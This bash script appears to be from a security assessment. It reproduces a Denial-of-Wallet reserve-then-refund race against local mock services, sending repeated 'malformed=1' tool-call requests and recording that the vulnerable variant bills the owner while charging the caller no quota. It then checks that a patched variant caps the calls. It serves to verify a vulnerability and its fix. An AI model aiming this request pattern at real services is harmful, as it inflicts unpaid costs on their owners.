#!/usr/bin/env bash
# WM-002 — reproduces the GHSA-hcq5-jm84-2395 Denial-of-Wallet pattern
# (reserve-then-refund TOCTOU) against the minimal reproduction harness,
# driven over real HTTP against a real (local) mock-upstream so the billing
# event is independently observable. NOT the live target — see docs/ROE.md.
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "$ROOT"

UPSTREAM_PORT=4001
VULN_PORT=4201
PATCH_PORT=4202
EVIDENCE_DIR="findings/WM-002/evidence"
N_ATTACK_CALLS=10
mkdir -p "$EVIDENCE_DIR"

echo "starting mock-upstream ($UPSTREAM_PORT), dow-mock vulnerable ($VULN_PORT), dow-mock patched ($PATCH_PORT)..."
node lab/mock-upstream/server.mjs $UPSTREAM_PORT > /tmp/wm002-upstream.log 2>&1 &
UP_PID=$!
sleep 0.5
node lab/repro-services/dow-mock/vulnerable.mjs $VULN_PORT $UPSTREAM_PORT > /tmp/wm002-vuln.log 2>&1 &
DV_PID=$!
node lab/repro-services/dow-mock/patched.mjs $PATCH_PORT $UPSTREAM_PORT > /tmp/wm002-patch.log 2>&1 &
DP_PID=$!
sleep 1

curl -s http://localhost:$UPSTREAM_PORT/_meta/reset > /dev/null

echo "--- driving $N_ATTACK_CALLS malformed=1 calls at the VULNERABLE variant ---"
for i in $(seq 1 $N_ATTACK_CALLS); do
  curl -s -H "X-Caller-Id: attacker" "http://localhost:$VULN_PORT/mcp/tool-call?target=x&malformed=1" > /dev/null
done
curl -s -H "X-Caller-Id: attacker" http://localhost:$VULN_PORT/_meta/quota | tee "$EVIDENCE_DIR/vulnerable-quota-after-attack.json"
echo
curl -s http://localhost:$UPSTREAM_PORT/_meta/calls | tee "$EVIDENCE_DIR/upstream-calls-after-vulnerable-attack.json"
echo

echo
echo "--- resetting upstream call log, driving same attack at the PATCHED variant ---"
curl -s http://localhost:$UPSTREAM_PORT/_meta/reset > /dev/null
for i in $(seq 1 $N_ATTACK_CALLS); do
  curl -s -H "X-Caller-Id: attacker" "http://localhost:$PATCH_PORT/mcp/tool-call?target=x&malformed=1" > /dev/null
done
curl -s -H "X-Caller-Id: attacker" http://localhost:$PATCH_PORT/_meta/quota | tee "$EVIDENCE_DIR/patched-quota-after-attack.json"
echo
curl -s http://localhost:$UPSTREAM_PORT/_meta/calls | tee "$EVIDENCE_DIR/upstream-calls-after-patched-attack.json"
echo

kill $UP_PID $DV_PID $DP_PID 2>/dev/null || true
wait 2>/dev/null || true

echo
echo "--- assertion ---"
node -e "
const fs = require('fs');
const vulnQuota = JSON.parse(fs.readFileSync('$EVIDENCE_DIR/vulnerable-quota-after-attack.json', 'utf8'));
const vulnBills = JSON.parse(fs.readFileSync('$EVIDENCE_DIR/upstream-calls-after-vulnerable-attack.json', 'utf8'));
const patchQuota = JSON.parse(fs.readFileSync('$EVIDENCE_DIR/patched-quota-after-attack.json', 'utf8'));
const patchBills = JSON.parse(fs.readFileSync('$EVIDENCE_DIR/upstream-calls-after-patched-attack.json', 'utf8'));

console.log('vulnerable: quota.used =', vulnQuota.used, '(expected 0 despite', $N_ATTACK_CALLS, 'attack calls) | upstream billable calls:', vulnBills.billable);
console.log('patched:    quota.used =', patchQuota.used, '/', patchQuota.dailyBudget, '(expected fully consumed) | upstream billable calls:', patchBills.billable);

if (vulnQuota.used !== 0) { console.error('FAIL: expected vulnerable quota.used === 0'); process.exit(1); }
if (vulnBills.billable !== $N_ATTACK_CALLS) { console.error('FAIL: expected', $N_ATTACK_CALLS, 'billable upstream calls on vulnerable run'); process.exit(1); }
if (patchBills.billable > patchQuota.dailyBudget) { console.error('FAIL: patched variant still allowed more billable calls than its own daily budget'); process.exit(1); }

console.log();
console.log('PASS: on the vulnerable variant,', $N_ATTACK_CALLS, 'attack calls cost the attacker ZERO quota while billing the owner', vulnBills.billable, 'real upstream calls.');
console.log('PASS: on the patched variant, the same attack is capped at exactly the daily budget (' + patchQuota.dailyBudget + ' calls), regardless of attack volume.');
"
echo "WM-002 reproduce.sh: PASS"
